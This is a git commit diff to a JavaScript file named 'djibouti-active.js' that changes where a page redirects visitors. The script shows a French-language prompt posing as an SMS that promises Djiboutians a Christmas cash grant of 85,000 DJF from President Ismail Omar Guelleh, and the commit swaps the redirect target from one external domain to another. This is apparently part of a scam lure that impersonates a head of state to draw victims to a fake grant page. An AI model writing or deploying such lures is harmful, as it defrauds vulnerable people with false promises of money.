9738bc7ebcbb3eb2e809f303fb5bfc6866fc9a93
surprise24x7 <132287490+surprise24x7@users.noreply.github.com>
2024-12-15 18:49:15 +0530

    Update djibouti-active.js

--- djibouti-active.js
+++ djibouti-active.js
@@ -2,5 +2,5 @@
 var password = 'RETIRER 85 000DJF'
 password=prompt('SMS : Félicitations, vous êtes éligible à la subvention de Noël en espèces de 85 000DJF du Président ISMAIL OMAR GUELLEH pour les DJIBOUTIENS. Veuillez appuyer sur OK pour retirer le prix en espèces.   ','RETIRER 85 000DJF');
 if (password != 'RETIRER 85 000DJF') {
-location.href='https://all-free-byt.org/djibouti-grant.html';
+location.href='https://zaget.cc/djibouti-grant.html';
 }
